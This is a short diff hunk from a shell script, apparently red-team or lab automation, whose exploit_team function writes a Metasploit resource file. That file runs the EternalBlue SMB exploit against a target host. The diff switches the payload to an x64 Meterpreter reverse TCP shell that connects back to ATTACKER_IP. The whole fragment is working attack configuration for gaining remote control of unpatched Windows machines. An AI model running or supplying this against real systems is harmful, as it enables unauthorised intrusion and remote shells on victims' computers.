@@ -123,7 +123,7 @@ exploit_team() {
   cat > "$RC_FILE" << EOF
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS ${TARGET}
-set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST ${ATTACKER_IP}
 set LPORT ${LPORT}
 set TARGET 0
